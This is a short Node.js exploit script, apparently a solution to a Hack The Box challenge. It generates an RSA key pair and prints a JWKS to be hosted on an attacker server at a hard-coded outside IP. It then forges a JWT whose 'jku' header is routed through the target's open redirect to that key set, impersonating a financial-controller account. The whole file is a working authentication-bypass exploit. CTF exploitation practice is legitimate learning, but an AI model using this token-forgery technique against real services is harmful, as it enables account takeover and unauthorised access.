import crypto from 'crypto';
import jwt from 'jsonwebtoken';

// change me
const kid = 'a41b5786-d4a2-442c-91f2-06db5b2fad00';
const { publicKey,privateKey } = crypto.generateKeyPairSync('rsa', {
  modulusLength: 2048,
  publicKeyEncoding: { type: 'spki', format: 'pem' },
  privateKeyEncoding: { type: 'pkcs8', format: 'pem' }, 
});


const publicKeyObject = crypto.createPublicKey(publicKey);
const publicJwk = publicKeyObject.export({ format: 'jwk' });

const jwk = {
  kty: 'RSA',
  ...publicJwk,
  alg: 'RS256',
  use: 'sig',
  kid,
};

const jwks = {
  keys: [jwk],
};


// host this as j.json on your server/ngrok
console.log(JSON.stringify(jwks));
//console.log();
//console.log(JSON.stringify(privateKey));
// change me
const tampered_keys = 'http://45.129.78.70:8888/j.json';
const jku = 'http://127.0.0.1:1337/api/analytics/redirect?ref=cta-announcement&url='+tampered_keys;

const payload = { 'email': 'financial-controller@frontier-board.htb' };
const token =  jwt.sign(payload, privateKey, {
  algorithm: 'RS256',
  header: {
    kid,
    jku
  }
});

console.log(token);
